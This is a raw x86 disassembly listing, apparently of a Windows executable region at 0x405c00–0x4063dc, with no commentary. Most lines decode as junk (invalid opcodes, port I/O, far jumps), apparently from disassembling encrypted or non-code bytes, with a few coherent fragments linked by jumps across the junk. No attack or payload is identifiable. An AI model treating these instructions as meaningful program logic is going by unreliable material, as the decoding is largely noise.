  405c00:	xchg   esi,eax
  405c01:	aam    0xc9
  405c03:	scas   eax,DWORD PTR es:[edi]
  405c04:	out    0x62,al
  405c06:	rcr    DWORD PTR [ebp+0x15baace3],0x47
  405c0d:	stc    
  405c0e:	inc    ecx
  405c0f:	dec    esp
  405c10:	xor    eax,0x6fd02bda
  405c15:	or     DWORD PTR [eax-0x13],edx
  405c18:	jecxz  0x405c21
  405c1a:	fisttp DWORD PTR [edi-0x6a]
  405c1d:	push   ds
  405c1e:	lods   eax,DWORD PTR ds:[esi]
  405c1f:	xor    eax,0x23645731
  405c24:	xor    esp,DWORD PTR [ebp+0x70d1e27e]
  405c2a:	mov    ah,0x6a
  405c2c:	test   al,0x82
  405c2e:	mov    esi,0xdc323d88
  405c33:	inc    eax
  405c34:	(bad)  
  405c35:	pop    edi
  405c36:	sbb    al,0x52
  405c38:	mov    bh,0x92
  405c3a:	es call 0xaf53:0x6a0a49d7
  405c42:	mov    cl,0x4b
  405c44:	adc    edi,edi
  405c46:	pop    esp
  405c47:	cmp    DWORD PTR [esp+edx*2+0xa],ecx
  405c4b:	add    DWORD PTR [esi-0x429eba38],ebx
  405c51:	jmp    0x405c10
  405c53:	push   ds
  405c54:	cmp    al,0x4d
  405c56:	sahf   
  405c57:	in     al,dx
  405c58:	xchg   ebx,eax
  405c59:	adc    BYTE PTR [edx-0x33],ch
  405c5c:	jmp    0x8f8dc105
  405c61:	std    
  405c62:	dec    ebp
  405c63:	jnp    0x405c8d
  405c65:	ins    BYTE PTR es:[edi],dx
  405c66:	dec    ecx
  405c67:	mov    ds:0x7d9e0570,eax
  405c6c:	pop    edx
  405c6d:	aaa    
  405c6e:	mov    gs,WORD PTR [edx]
  405c70:	dec    edx
  405c71:	push   eax
  405c72:	xor    eax,0x3c036488
  405c77:	sbb    ebx,edx
  405c79:	(bad)  
  405c7a:	in     eax,dx
  405c7b:	mov    eax,0x90efd81d
  405c80:	inc    ebx
  405c81:	pop    esi
  405c82:	or     BYTE PTR [ebp-0x1a],bl
  405c85:	mov    WORD PTR [ecx+ebx*8],gs
  405c88:	xchg   esp,eax
  405c89:	out    0x1f,eax
  405c8b:	fild   QWORD PTR [esi-0x2]
  405c8e:	pop    ds
  405c8f:	call   0x1b87:0x3cc21e58
  405c96:	ret    0xa13b
  405c99:	out    dx,al
  405c9a:	ds mov esp,0x146b67a1
  405ca0:	lock push 0xa11f40d1
  405ca6:	mov    eax,0x9c794a8c
  405cab:	inc    ecx
  405cac:	test   bl,bl
  405cae:	push   ecx
  405caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405cb0:	mov    eax,0x862da770
  405cb5:	push   edx
  405cb6:	sub    ebp,DWORD PTR [edx]
  405cb8:	adc    al,0x8c
  405cba:	push   eax
  405cbb:	(bad)
  405cbe:	push   0xfb511a52
  405cc3:	loope  0x405c48
  405cc5:	ficomp DWORD PTR [eax]
  405cc7:	imul   ebp,DWORD PTR [esi],0xfffffff8
  405cca:	xchg   ebx,eax
  405ccb:	mov    cl,ch
  405ccd:	jp     0x405ccb
  405ccf:	jecxz  0x405ca9
  405cd1:	jbe    0x405ccf
  405cd3:	mov    ecx,DWORD PTR [eax]
  405cd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cd6:	shr    DWORD PTR [esi-0x23],cl
  405cd9:	push   ss
  405cda:	pop    edx
  405cdb:	mov    ch,0xd7
  405cdd:	and    BYTE PTR [ebp+edi*1-0x1454ce50],ch
  405ce4:	jge    0x405cfd
  405ce6:	stos   BYTE PTR es:[edi],al
  405ce7:	xchg   ebp,eax
  405ce8:	push   ds
  405ce9:	inc    ebp
  405cea:	mov    esi,0x2c1ff258
  405cef:	ins    BYTE PTR es:[edi],dx
  405cf0:	mov    WORD PTR [edx+0x6627801a],?
  405cf6:	pop    es
  405cf7:	mov    cl,0x51
  405cf9:	pop    ebx
  405cfa:	mov    dh,0x90
  405cfc:	shl    BYTE PTR [eax+0x7b],cl
  405cff:	sub    edi,0x1c3c680d
  405d05:	adc    al,0xd2
  405d07:	test   BYTE PTR [edi],cl
  405d09:	xor    DWORD PTR [ebx],eax
  405d0b:	jae    0x405d7b
  405d0d:	retf   
  405d0e:	sub    cl,BYTE PTR [eax]
  405d10:	out    0xee,eax
  405d12:	lock cmp eax,0x6136d2ac
  405d18:	sbb    al,0x6d
  405d1a:	and    BYTE PTR [edi],bh
  405d1c:	sub    DWORD PTR [esi-0x5862a5e1],edi
  405d22:	mov    edx,0x6367b41b
  405d27:	pop    es
  405d28:	mov    eax,ds:0xd1212c12
  405d2d:	sbb    eax,0x24d04a85
  405d32:	xchg   edx,eax
  405d33:	jns    0x405ce2
  405d35:	stc    
  405d36:	sbb    al,0x31
  405d38:	mov    BYTE PTR [eax+0x4d],al
  405d3b:	cmp    esp,DWORD PTR [edx]
  405d3d:	repz and eax,0x28e210b3
  405d43:	scas   al,BYTE PTR es:[edi]
  405d44:	mov    cl,0xaf
  405d46:	adc    esi,DWORD PTR [edx]
  405d48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d49:	sub    BYTE PTR [ebx-0x369b5a31],0xf0
  405d50:	jns    0x405d70
  405d52:	xor    DWORD PTR [eax+ebp*8+0x23],ecx
  405d56:	aam    0x37
  405d58:	jno    0x405cea
  405d5a:	inc    ecx
  405d5b:	out    0xeb,eax
  405d5d:	mov    edi,0xa3a5a5c5
  405d62:	popa   
  405d63:	jmp    FWORD PTR [ecx-0x56]
  405d66:	sti    
  405d67:	xor    BYTE PTR [ecx+eax*1-0x6c1a2195],bh
  405d6e:	sbb    DWORD PTR [ebp+0x65],ebp
  405d71:	pop    ss
  405d72:	jno    0x405dc8
  405d74:	dec    ebp
  405d75:	repz out 0xc8,eax
  405d78:	retf   0x76a0
  405d7b:	xchg   ebx,eax
  405d7c:	(bad)  
  405d7d:	loope  0x405dd9
  405d7f:	dec    ebx
  405d80:	out    0xa4,eax
  405d82:	push   0x899cb9bd
  405d87:	mov    esp,0x49eaf567
  405d8c:	mov    cl,0x2
  405d8e:	outs   dx,DWORD PTR ds:[esi]
  405d8f:	inc    ebp
  405d90:	pop    esp
  405d91:	in     eax,0x8b
  405d93:	inc    ebp
  405d94:	lock mov eax,DWORD PTR [eax+0x198]
  405d9b:	push   DWORD PTR [eax]
  405d9d:	call   0x40cdc5
  405da2:	mov    DWORD PTR [ebp-0x8],eax
  405da5:	cmp    DWORD PTR [ebp-0x8],0x0
  405da9:	lea    eax,[ebp+0x4]
  405dac:	jmp    0x405fa4
  405db1:	xchg   ebx,eax
  405db2:	leave  
  405db3:	ror    DWORD PTR [esi-0x2eae69af],1
  405db9:	mov    ds:0x299c135b,al
  405dbe:	(bad)  
  405dbf:	into   
  405dc0:	repnz inc edi
  405dc2:	aaa    
  405dc3:	jle    0x405e43
  405dc5:	push   ebp
  405dc6:	jg     0x405e46
  405dc8:	jle    0x405e33
  405dca:	test   esi,0x59d7bc37
  405dd0:	data16 stos BYTE PTR es:[edi],al
  405dd2:	adc    al,0xb
  405dd4:	cmp    DWORD PTR [edi-0x72],edx
  405dd7:	mov    eax,ds:0x2da7d5b7
  405ddc:	sbb    eax,0xe37e0f06
  405de1:	mov    esi,es
  405de3:	add    eax,0xb49ecb5a
  405de8:	sbb    eax,0x3c3f2eba
  405ded:	pop    ds
  405dee:	fnstsw WORD PTR [ebx+0x2c]
  405df1:	jp     0x405e3d
  405df3:	jmp    0x51c4:0x75c232b4
  405dfa:	inc    edx
  405dfb:	pop    edx
  405dfc:	cmp    esi,DWORD PTR [ecx+esi*4-0x7519411b]
  405e03:	(bad)  
  405e04:	mov    al,ds:0xe2373281
  405e09:	mov    ecx,0xa7c5bdd6
  405e0e:	ins    DWORD PTR es:[edi],dx
  405e0f:	and    edi,DWORD PTR [esp+esi*1+0x2c087ca1]
  405e16:	pop    edx
  405e17:	inc    ecx
  405e18:	sbb    al,0x14
  405e1a:	fcomp  DWORD PTR [ecx+0x1e]
  405e1d:	mov    BYTE PTR [ebx-0x34],cl
  405e20:	hlt    
  405e21:	adc    eax,0xc6efff3b
  405e26:	shl    DWORD PTR [edi-0x7cead0fd],cl
  405e2c:	xchg   esp,eax
  405e2d:	and    eax,0x9adef24b
  405e32:	pop    esi
  405e33:	ret    0xa550
  405e36:	imul   edi,DWORD PTR [ecx+0x1c],0xffffffb9
  405e3a:	and    ecx,DWORD PTR [eax]
  405e3c:	mov    ds:0x45bbe966,al
  405e41:	and    bh,BYTE PTR [esi]
  405e43:	jle    0x405e06
  405e45:	mov    edx,0xac404361
  405e4a:	xchg   esi,eax
  405e4b:	push   ss
  405e4c:	ins    BYTE PTR es:[edi],dx
  405e4d:	sti    
  405e4e:	pop    ebp
  405e4f:	(bad)  
  405e51:	stos   BYTE PTR es:[edi],al
  405e52:	lds    esi,FWORD PTR [ecx-0x65720ae6]
  405e58:	jl     0x405ec7
  405e5a:	lods   al,BYTE PTR ds:[esi]
  405e5b:	out    0xea,al
  405e5d:	(bad)  
  405e5e:	add    dl,BYTE PTR [eax+0x10]
  405e61:	or     BYTE PTR [ebp+0x2d1ce87d],bl
  405e67:	mov    ch,0xc6
  405e69:	addr16 pop ebx
  405e6b:	xor    eax,0xdf58b936
  405e70:	fld    TBYTE PTR [eax+0x22ef75cf]
  405e76:	sbb    eax,0x2d48797a
  405e7b:	int3   
  405e7c:	adc    eax,eax
  405e7e:	jl     0x405e33
  405e80:	xor    bh,BYTE PTR [ecx]
  405e82:	xchg   DWORD PTR [esp+edi*8-0x7f59272f],ecx
  405e89:	test   BYTE PTR [eax],dl
  405e8b:	mov    bh,dh
  405e8d:	cmp    BYTE PTR [ecx],ch
  405e8f:	shr    bl,cl
  405e91:	jl     0x405e58
  405e93:	xor    BYTE PTR [edi+0x15234c81],dh
  405e99:	add    edi,DWORD PTR [ebx]
  405e9b:	cmp    cl,cl
  405e9d:	or     al,BYTE PTR [ecx-0x71]
  405ea0:	mov    WORD PTR [esi+0x76cb1f42],gs
  405ea6:	(bad)  
  405ea7:	addr16 push ds
  405ea9:	in     al,0xab
  405eab:	jb     0x405e94
  405ead:	sub    al,BYTE PTR [eax-0x11]
  405eb0:	push   ds
  405eb1:	mov    eax,ds:0x71ce7f45
  405eb6:	sbb    eax,eax
  405eb8:	xchg   ebp,edi
  405eba:	js     0x405ea2
  405ebc:	sub    al,0x1f
  405ebe:	data16 mov BYTE PTR [edx+eiz*8],bh
  405ec2:	xchg   ecx,eax
  405ec3:	(bad)  
  405ec6:	mov    BYTE PTR [ebx],ah
  405ec8:	sbb    esp,0xc9c4400c
  405ece:	loop   0x405f31
  405ed0:	pop    es
  405ed1:	or     esi,DWORD PTR [ecx]
  405ed3:	loop   0x405f1e
  405ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ed6:	cmp    DWORD PTR [esi],esp
  405ed8:	dec    ebp
  405ed9:	lahf   
  405eda:	sbb    eax,0x319065e3
  405edf:	sub    eax,0xcf6afadd
  405ee4:	lahf   
  405ee5:	out    0xfa,al
  405ee7:	out    0xdf,al
  405ee9:	xchg   DWORD PTR [ebx-0x38c00e4e],ebp
  405eef:	add    eax,0xb42ed4c6
  405ef4:	lds    ebx,FWORD PTR [eax]
  405ef6:	xor    cl,dl
  405ef8:	push   ebx
  405ef9:	inc    ebp
  405efa:	std    
  405efb:	es dec ebp
  405efd:	xor    DWORD PTR [edi-0x6112db48],edx
  405f03:	inc    esi
  405f04:	pop    edi
  405f05:	cmp    al,0xfd
  405f07:	cmp    DWORD PTR ds:0x5f6efcc4,esp
  405f0d:	cmp    bl,BYTE PTR [ebp+0x2b8a50d3]
  405f13:	mov    ebx,esp
  405f15:	into   
  405f16:	mov    dl,0x7c
  405f18:	shl    DWORD PTR [eax+0x19698fbf],1
  405f1e:	push   cs
  405f1f:	fwait
  405f20:	cmp    ecx,edi
  405f22:	or     ch,BYTE PTR fs:[ebp-0x6616c5c6]
  405f29:	jae    0x405f5e
  405f2b:	fstp   QWORD PTR [ebx+0x3a]
  405f2e:	xchg   edi,eax
  405f2f:	lock push cs
  405f31:	les    edi,FWORD PTR [ecx+0x73]
  405f34:	das    
  405f35:	loope  0x405f3d
  405f37:	push   edx
  405f38:	iret   
  405f39:	fmul   DWORD PTR [edi-0x1da0ca3b]
  405f3f:	jnp    0x405f85
  405f41:	inc    esp
  405f42:	add    ch,bh
  405f44:	push   0xfffffff4
  405f46:	shld   esi,esi,cl
  405f49:	ficom  WORD PTR [ebx]
  405f4b:	popa   
  405f4c:	adc    eax,0x10fd5714
  405f51:	jns    0x405fa3
  405f53:	repz adc esp,DWORD PTR fs:[esi]
  405f57:	fcomp  DWORD PTR [edi-0x4b]
  405f5a:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  405f5c:	fldenv [ebx-0x1faadb66]
  405f62:	mov    al,ds:0xa29a6930
  405f67:	div    DWORD PTR [ecx-0x79]
  405f6a:	or     eax,0xbe294015
  405f6f:	jb     0x405f3b
  405f71:	jne    0x405f19
  405f73:	inc    esp
  405f74:	nop
  405f75:	push   0xbfce44a
  405f7a:	stos   BYTE PTR es:[edi],al
  405f7b:	fnstenv [ebx-0x6f]
  405f7e:	and    al,0x19
  405f80:	mov    esi,0xd1bef8f8
  405f85:	sbb    al,0x66
  405f87:	jl     0x405f26
  405f89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f8a:	xchg   ah,dl
  405f8c:	or     eax,0x52463553
  405f91:	pop    ebp
  405f92:	call   0x5393:0xab3639b8
  405f99:	jmp    0xe59758f1
  405f9e:	jo     0x405f29
  405fa0:	rol    ebx,1
  405fa2:	into   
  405fa3:	sbb    DWORD PTR [ecx-0x7bf01fbb],ecx
  405fa9:	xchg   esi,eax
  405faa:	or     al,BYTE PTR [eax]
  405fac:	add    cl,ch
  405fae:	repz add DWORD PTR [eax],eax
  405fb1:	add    bl,ch
  405fb3:	hlt    
  405fb4:	pushf  
  405fb5:	dec    esi
  405fb6:	mov    eax,ds:0x9371e956
  405fbb:	inc    ebx
  405fbc:	and    dl,BYTE PTR [ecx-0x12]
  405fbf:	mov    eax,0x359a2576
  405fc4:	jle    0x406044
  405fc6:	push   ebp
  405fc7:	jg     0x406047
  405fc9:	jle    0x405f67
  405fcb:	mov    dl,0xa4
  405fcd:	push   ds
  405fce:	jmp    0x405fee
  405fd0:	pop    ds
  405fd1:	hlt    
  405fd2:	test   ecx,ebx
  405fd4:	in     eax,0x89
  405fd6:	ss (bad) 
  405fd8:	out    dx,al
  405fd9:	jbe    0x405f83
  405fdb:	addr16 xchg ebp,eax
  405fdd:	stos   DWORD PTR es:[edi],eax
  405fde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fdf:	cmp    esp,edx
  405fe1:	fmul   QWORD PTR [edx*8-0x17213f8d]
  405fe8:	sub    al,0x7f
  405fea:	jne    0x406016
  405fec:	push   ecx
  405fed:	cmp    edx,DWORD PTR [ebp-0x17]
  405ff0:	mov    ds:0xb3f1b583,eax
  405ff5:	mov    esi,0x14ce436d
  405ffa:	add    eax,0x5b75ebe
  405fff:	and    al,0x5a
  406001:	stos   BYTE PTR es:[edi],al
  406002:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406003:	fwait
  406004:	stc    
  406005:	mov    al,0xb2
  406007:	mov    edx,0x22c1c08a
  40600c:	je     0x40600c
  40600e:	cmp    eax,ebx
  406010:	les    ebp,FWORD PTR [esi+0xc]
  406013:	xor    DWORD PTR [edi+eax*4+0x41d213d],esp
  40601a:	sub    al,0xa3
  40601c:	rcr    DWORD PTR [ebx+0x1bf472d8],1
  406022:	fsubr  st,st(0)
  406024:	add    DWORD PTR [edx-0x3932c16b],ecx
  40602a:	mov    ebp,0x33a3225a
  40602f:	fwait
  406030:	sar    BYTE PTR [eax+0x2b],1
  406033:	xor    ecx,DWORD PTR [ecx]
  406035:	and    al,BYTE PTR [esi]
  406037:	mov    al,ds:0xe834517a
  40603c:	push   cs
  40603d:	not    DWORD PTR [ebx+0x38]
  406040:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406041:	les    edi,FWORD PTR [edi+0x31121af6]
  406047:	std    
  406048:	mov    cl,0xd9
  40604a:	call   0xd19a9ff7
  40604f:	adc    eax,DWORD PTR [edi]
  406051:	fcom   st(3)
  406053:	jbe    0x40604f
  406055:	icebp  
  406056:	(bad)  
  406057:	out    0x44,eax
  406059:	rcl    BYTE PTR [ebp+0x37],cl
  40605c:	(bad)  
  40605e:	stc    
  40605f:	into   
  406060:	mov    dl,0x88
  406062:	pop    esi
  406063:	xor    dh,BYTE PTR [edi-0x6e]
  406066:	lock imul ebx,DWORD PTR [eax],0xffffffc7
  40606a:	lea    edx,[ebp-0x6c9e1cec]
  406070:	pop    ecx
  406071:	inc    edi
  406072:	add    BYTE PTR [edi+0xa1ae869],dl
  406078:	enter  0xee27,0xcf
  40607c:	adc    bh,BYTE PTR [esi-0x626cb819]
  406082:	mov    ch,BYTE PTR [ecx+0x75984908]
  406088:	sahf   
  406089:	cmp    dl,BYTE PTR [esi+0x5f]
  40608c:	sti    
  40608d:	mov    cl,0x59
  40608f:	sbb    al,0x9
  406091:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406092:	or     ebx,DWORD PTR [ebp-0x676ac3a9]
  406098:	std    
  406099:	xchg   BYTE PTR [ebx],bl
  40609b:	and    esp,0x3329ada4
  4060a1:	pop    esi
  4060a2:	lods   al,BYTE PTR ds:[esi]
  4060a3:	outs   dx,DWORD PTR ds:[esi]
  4060a4:	pop    ecx
  4060a5:	mov    ch,0xaa
  4060a7:	ss and BYTE PTR gs:[esi+0x64d87bf1],cl
  4060af:	add    DWORD PTR [edx-0x27],0xb23240ea
  4060b6:	pop    ss
  4060b7:	xor    eax,0xcd3abcaf
  4060bc:	and    al,0x83
  4060be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060bf:	rcr    DWORD PTR [eax+0x7c43b7f5],1
  4060c5:	es dec esp
  4060c7:	inc    ebx
  4060c8:	es inc edx
  4060ca:	(bad)  
  4060cb:	retf   0x2725
  4060ce:	lea    esp,[edi+0x281a16a9]
  4060d4:	fidivr DWORD PTR [eax-0x7a]
  4060d7:	rcr    DWORD PTR [edi-0x617efd5b],1
  4060dd:	jns    0x40614b
  4060df:	int    0xc
  4060e1:	shr    cl,1
  4060e3:	cmp    al,0xfb
  4060e5:	shr    DWORD PTR [eax],1
  4060e7:	(bad)  
  4060e8:	adc    ch,bl
  4060ea:	jmp    0x4d6b:0x8217c849
  4060f1:	push   edx
  4060f2:	mov    al,0x96
  4060f4:	add    ecx,DWORD PTR [edx+0x44]
  4060f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060f8:	mov    eax,0xcd8116a1
  4060fd:	xchg   esp,eax
  4060fe:	mov    ah,0x9f
  406100:	rcr    BYTE PTR [ebp-0x4e],1
  406103:	jo     0x4060d0
  406105:	pop    edi
  406106:	lahf   
  406107:	rol    ebp,0xf3
  40610a:	push   0x46
  40610c:	jnp    0x406138
  40610e:	imul   edi,ecx,0x2dec1dd1
  406114:	cmc    
  406115:	xchg   ecx,eax
  406116:	mov    bl,BYTE PTR [edi+0x7c]
  406119:	jge    0x40613c
  40611b:	xchg   esp,eax
  40611c:	test   DWORD PTR [eax+0x2648c471],eax
  406122:	(bad)  
  406123:	dec    esi
  406124:	cmp    ebp,ebp
  406126:	sti    
  406127:	adc    edx,DWORD PTR [ecx+0x3dd3383d]
  40612d:	or     BYTE PTR [eax],ch
  40612f:	jbe    0x4061ac
  406131:	test   BYTE PTR [ebx+0x21],ch
  406134:	scas   al,BYTE PTR es:[edi]
  406135:	mov    WORD PTR [ebx],es
  406137:	cdq    
  406138:	add    eax,0x5f3c1a6b
  40613d:	neg    ch
  40613f:	pop    eax
  406140:	std    
  406141:	jb     0x40614d
  406143:	jb     0x406134
  406145:	pop    ds
  406146:	jbe    0x4061bf
  406148:	mov    BYTE PTR [esi+0x48],bl
  40614b:	jmp    DWORD PTR [ebp-0x77]
  40614e:	lods   al,BYTE PTR ds:[esi]
  40614f:	iret   
  406150:	aam    0x39
  406152:	fidivr DWORD PTR [esi+0x43]
  406155:	mov    BYTE PTR [esi-0x69],dl
  406158:	mov    dh,0x25
  40615a:	icebp  
  40615b:	fdiv   DWORD PTR [ebp+0x5a9dc0cd]
  406161:	pop    ebx
  406162:	and    al,0xe9
  406164:	lock sbb DWORD PTR [eax+0x7ad364ab],eax
  40616b:	imul   dl
  40616d:	sub    al,0x2c
  40616f:	ret    
  406170:	sahf   
  406171:	loope  0x406154
  406173:	mov    DWORD PTR [ecx+ebp*1-0x30],edx
  406177:	sub    dl,BYTE PTR [ebp+ecx*1+0x7e2c5a84]
  40617e:	sbb    edx,DWORD PTR [ecx]
  406180:	jecxz  0x40611c
  406182:	(bad)  
  406183:	dec    ebp
  406184:	mov    eax,0x2b169a6
  406189:	hlt    
  40618a:	int3   
  40618b:	jo     0x4061c5
  40618d:	mov    edx,0x928af5de
  406192:	xor    eax,0xbf9eb352
  406197:	call   0xdfb3:0x17b5ed77
  40619e:	es jge 0x406212
  4061a1:	add    al,0xbd
  4061a3:	js     0x406188
  4061a5:	lea    eax,[ebp-0x18]
  4061a8:	push   eax
  4061a9:	mov    eax,DWORD PTR [ebp-0x2c]
  4061ac:	xor    eax,esi
  4061ae:	add    eax,edi
  4061b0:	push   eax
  4061b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4061b4:	xor    eax,esi
  4061b6:	add    eax,edi
  4061b8:	push   eax
  4061b9:	push   DWORD PTR [ebp-0x8]
  4061bc:	lea    eax,[ebp-0x78]
  4061bf:	push   eax
  4061c0:	jmp    0x4063b8
  4061c5:	cmp    eax,0xb41aac57
  4061ca:	loope  0x406215
  4061cc:	jno    0x406181
  4061ce:	dec    edi
  4061cf:	add    dl,cl
  4061d1:	jb     0x40623e
  4061d3:	jbe    0x406197
  4061d5:	icebp  
  4061d6:	xor    edi,DWORD PTR [esi+0x7e]
  4061d9:	push   ebp
  4061da:	jg     0x40625a
  4061dc:	jle    0x4061a8
  4061de:	mov    cs,ebx
  4061e0:	mov    al,al
  4061e2:	ja     0x4061ec
  4061e4:	and    BYTE PTR [esi-0x6badd1e7],ch
  4061ea:	dec    ebp
  4061eb:	imul   edx,ebp,0x8b06b3a7
  4061f1:	add    eax,DWORD PTR [edx]
  4061f3:	mov    edx,0xd55ff0c9
  4061f8:	mov    esp,DWORD PTR [ecx+0x51c7a122]
  4061fe:	sti    
  4061ff:	xchg   esi,eax
  406200:	push   es
  406201:	loopne 0x40621d
  406203:	jmp    0x406245
  406205:	leave  
  406206:	or     ch,BYTE PTR [edi]
  406208:	pop    esi
  406209:	pop    edi
  40620a:	ficom  DWORD PTR [edx*2+0x313c2d82]
  406211:	xor    cl,BYTE PTR [esi]
  406213:	les    ebp,FWORD PTR [esi-0x2c]
  406216:	fbstp  TBYTE PTR [edi-0x6a3bc904]
  40621c:	mov    gs,WORD PTR [esi-0x64]
  40621f:	in     eax,0x10
  406221:	inc    ebp
  406222:	inc    ebp
  406223:	loope  0x4062a1
  406225:	out    dx,eax
  406226:	ds aam 0xee
  406229:	inc    eax
  40622a:	jo     0x4062a6
  40622c:	in     al,0x8
  40622e:	pop    ebp
  40622f:	cwde   
  406230:	push   ecx
  406231:	jb     0x406225
  406233:	cli    
  406234:	push   DWORD PTR [edx]
  406236:	retf   0xa45d
  406239:	and    al,0x8d
  40623b:	jns    0x406240
  40623d:	pop    ss
  40623e:	mov    dh,0x3e
  406240:	xor    DWORD PTR [esi+0x7fc7160f],esp
  406246:	cli    
  406247:	in     al,0xa8
  406249:	shl    DWORD PTR [edi+0x3f],cl
  40624c:	sub    cl,BYTE PTR [ebp+edi*1-0x4cb60fd0]
  406253:	ror    BYTE PTR [eax+eax*8-0x29],1
  406257:	fwait
  406258:	stos   DWORD PTR es:[edi],eax
  406259:	cmp    BYTE PTR [edx],ch
  40625b:	mov    dh,0xe2
  40625d:	add    ah,BYTE PTR [ebx-0x71d79d1e]
  406263:	pop    es
  406264:	adc    DWORD PTR [eax-0x187dd7bf],esp
  40626a:	inc    ebx
  40626b:	in     al,0x78
  40626d:	mov    eax,0xbd3f1f67
  406272:	adc    ebx,DWORD PTR [esi+0x65]
  406275:	scas   al,BYTE PTR es:[edi]
  406276:	mov    ebp,0x48d5b9ee
  40627b:	sbb    esp,DWORD PTR [ebx+0x4cb654bd]
  406281:	sahf   
  406282:	jns    0x4062e4
  406284:	push   ebx
  406285:	out    0xb3,eax
  406287:	inc    eax
  406288:	inc    ebx
  406289:	mov    dl,0xbe
  40628b:	test   al,0x12
  40628d:	push   esp
  40628e:	pushf  
  40628f:	xor    BYTE PTR [ecx+0x5b],al
  406292:	sar    DWORD PTR [edi],1
  406294:	and    BYTE PTR [eax-0x63],0xd1
  406298:	sar    DWORD PTR [ecx+edx*4],cl
  40629b:	out    dx,eax
  40629c:	cmp    DWORD PTR [ebx+0x1e],eax
  40629f:	sbb    dh,bh
  4062a1:	jno    0x40629f
  4062a3:	not    BYTE PTR [edi-0x7e08e92a]
  4062a9:	mov    esi,DWORD PTR [ebx+0x30518d2b]
  4062af:	xchg   ecx,eax
  4062b0:	inc    edi
  4062b1:	out    0xc1,al
  4062b3:	dec    eax
  4062b4:	push   ss
  4062b5:	sub    bh,cl
  4062b7:	fisub  DWORD PTR [esi+0x4]
  4062ba:	div    DWORD PTR [ecx]
  4062bc:	pop    es
  4062bd:	push   0x47
  4062bf:	mov    fs,ecx
  4062c1:	call   DWORD PTR ds:0x6cb046b4
  4062c7:	sub    BYTE PTR [eax],cl
  4062c9:	(bad)  
  4062ca:	adc    al,0x26
  4062cc:	push   ebp
  4062cd:	xchg   esp,eax
  4062ce:	cld    
  4062cf:	cs scas eax,DWORD PTR es:[edi]
  4062d1:	mov    ah,0x40
  4062d3:	cmp    al,BYTE PTR [edi-0x14]
  4062d6:	or     eax,0xfd9bf895
  4062db:	nop
  4062dc:	sti    
  4062dd:	cld    
  4062de:	cmp    esp,edi
  4062e0:	loopne 0x4062bc
  4062e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062e3:	xchg   edi,eax
  4062e4:	test   DWORD PTR [esi],esi
  4062e6:	ja     0x4062b6
  4062e8:	push   ds
  4062e9:	mov    ah,0xc1
  4062eb:	je     0x40629d
  4062ed:	adc    eax,0xa4435f5d
  4062f2:	pop    edi
  4062f3:	pop    ecx
  4062f4:	xor    eax,0x8c38d0c
  4062f9:	retf   0x9acb
  4062fc:	int3   
  4062fd:	aam    0xbe
  4062ff:	xor    eax,0x3f277430
  406304:	jl     0x406317
  406306:	jmp    0x406324
  406308:	dec    edx
  406309:	jecxz  0x406378
  40630b:	jge    0x4062d6
  40630d:	popf   
  40630e:	mov    cs,WORD PTR [eax+ebp*4+0x79]
  406312:	js     0x4062c9
  406314:	loope  0x406315
  406316:	dec    eax
  406317:	xchg   BYTE PTR [esi],ch
  406319:	xor    al,0xb6
  40631b:	ins    DWORD PTR es:[edi],dx
  40631c:	jmp    0x4b8a:0xcdbddcdc
  406323:	js     0x40635d
  406325:	add    BYTE PTR [ecx+edx*2],ch
  406328:	push   ebp
  406329:	add    edi,DWORD PTR cs:[eax-0x64ef0c70]
  406330:	push   edi
  406331:	sti    
  406332:	aam    0x9f
  406334:	imul   esp,ebp,0x659154f6
  40633a:	test   esp,edi
  40633c:	jns    0x406343
  40633e:	imul   esi,edi,0x1d552c6
  406344:	sbb    DWORD PTR [esi],esp
  406346:	fidivr WORD PTR [ebp+0xf]
  406349:	xchg   ebx,eax
  40634a:	pop    ds
  40634b:	or     eax,0x685d191e
  406350:	ret    
  406351:	adc    al,0x3c
  406353:	xchg   BYTE PTR es:0x4cadd2c,cl
  40635a:	js     0x40635f
  40635c:	aas    
  40635d:	rcr    BYTE PTR [esi-0x59b8806e],cl
  406363:	push   es
  406364:	mov    dl,0xb9
  406366:	aaa    
  406367:	jl     0x4063e5
  406369:	iret   
  40636a:	icebp  
  40636b:	xchg   ebx,eax
  40636c:	inc    edi
  40636d:	dec    esi
  40636e:	test   BYTE PTR [eax-0x18],al
  406371:	mov    ax,ds:0x8ff2d731
  406377:	pop    ecx
  406378:	push   eax
  406379:	lea    ebx,[ebx-0x272b498b]
  40637f:	nop
  406380:	inc    edx
  406381:	sub    BYTE PTR [edx-0x32],0xfb
  406385:	jge    0x406378
  406387:	test   eax,0xb35c5b73
  40638c:	scas   al,BYTE PTR es:[edi]
  40638d:	jge    0x4063c8
  40638f:	push   0x6c
  406391:	mov    al,ds:0xca5034d0
  406396:	cmp    al,0x9d
  406398:	lahf   
  406399:	ds sti 
  40639b:	push   edi
  40639c:	xchg   BYTE PTR [edx+0x5879bec7],dl
  4063a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063a3:	fdiv   QWORD PTR [ebx]
  4063a5:	les    esi,FWORD PTR [ecx+0x2e]
  4063a8:	jmp    0xddf16778
  4063ad:	retf   
  4063ae:	bound  ebp,QWORD PTR [esi+0x806ea45]
  4063b4:	aaa    
  4063b5:	imul   esp,ebp,0xf475ff85
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0x15e0,0x14
  4063d1:	test   al,0xa
  4063d3:	aam    0x31
  4063d5:	jle    0x406455
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x4063bc
  4063dc:	mov    ecx,0x5a7edddf
